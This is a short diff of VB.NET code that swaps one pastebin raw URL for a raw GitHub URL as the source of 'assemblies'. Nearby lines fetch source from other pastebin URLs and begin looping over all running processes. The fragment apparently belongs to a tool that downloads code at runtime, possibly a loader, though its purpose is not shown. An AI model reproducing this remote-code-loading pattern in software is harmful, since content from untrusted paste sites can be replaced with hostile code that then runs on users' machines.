@@ -14,7 +14,7 @@ Public Class Main
             Me.sAssemblyPath = "http://pastebin.com/raw.php?i=T6CBMmTs"
         Else
             Me.sSourcePath = "http://pastebin.com/raw.php?i=19MbBA54"
-            Me.sAssemblyPath = "http://pastebin.com/raw.php?i=4p6s6zih"
+            Me.sAssemblyPath = "https://raw.githubusercontent.com/seybeta/Net/master/Assemblies.txt"
         End If
 
         For Each oProcess As Process In Process.GetProcesses
